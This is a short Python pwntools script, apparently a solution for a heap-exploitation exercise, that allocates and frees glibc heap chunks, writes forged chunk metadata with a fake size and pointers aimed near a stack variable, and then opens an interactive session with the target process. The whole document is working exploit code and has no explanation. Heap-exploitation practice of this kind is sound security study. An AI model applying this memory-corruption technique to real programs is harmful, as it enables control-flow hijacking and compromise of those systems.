from pwn import *
from handle import *

def exploit():
	malloc(0x400)
	malloc(0x10)
	malloc(0x500)
	malloc(0x10)
	malloc(0x500)
	malloc(0x10)

	free_chunk(0)
	free_chunk(2)

	malloc(0x100)

	free_chunk(4)

	target = stack_var_1_address()
	write_to_chunk(1, p64(0) * 3 + p64(0x351) + p64(0) + p64(target - 2*SIZE_SZ) + p64(0) + p64(target + 4*SIZE_SZ - 4*SIZE_SZ))

	malloc(0x140)

p = exec_file()
exploit()
p.interactive()
p.close()
